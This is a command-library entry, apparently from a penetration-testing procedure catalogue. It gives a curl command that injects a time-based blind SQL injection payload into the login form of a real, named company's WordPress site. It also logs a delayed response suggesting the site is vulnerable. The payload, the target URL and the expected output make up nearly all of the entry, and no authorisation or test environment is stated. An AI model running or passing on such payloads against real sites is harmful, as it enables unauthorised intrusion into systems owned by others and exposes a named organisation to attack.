---
id: cmd-curl-sleep-6-001
data: >-
  curl -X POST https://www.acronis.cz/wp-login.php -d
  "log=0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z&pwd=test&wp-submit=Log+In" -w
  "%{time_total}s"
tags:
  - sqli
  - blind-sqli
type: command
output: Response time of approximately 7.282 seconds.
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.880Z'
verified: false
validated: true
submitted: true
---
# curl-inject-sleep-6

## Command

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

## Description

Injects a 6-second sleep payload to verify scaling delays in SQLi testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d` | Payload with sleep(6) | Yes |
| `-w "%{time_total}s"` | Time output | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

### Advanced Usage

Add -v for headers.

## Expected Output

~7.282s response time.

## Related

- [[Related Procedure: Confirm SQLi with Varying Sleep Durations]]
